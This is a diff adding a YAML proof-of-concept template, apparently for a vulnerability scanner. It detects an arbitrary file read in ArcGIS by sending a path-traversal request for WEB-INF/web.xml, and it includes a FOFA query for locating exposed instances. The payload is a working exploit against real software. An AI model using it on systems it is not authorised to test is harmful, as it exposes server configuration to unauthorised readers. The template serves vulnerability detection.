@@ -1,0 +1,15 @@
+id: poc-yaml-arcgis-geographic-info-system-anyfile-read
+info:
+  name: ArcGIS 地理信息系统 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: arcgis
+  fofa: app="esri-ArcGIS" && icon_hash="229300816"
+requests:
+- method: GET
+  path: /arcgis/manager/3370/js//../WEB-INF/web.xml
+  expression: status_code == 200 && contains(body,"<display-name>") && contains(body,"<filter-name>")
+    && contains(body,"</web-app>") && contains(content_type,"application/xml")
+variables: {}
+transport: http
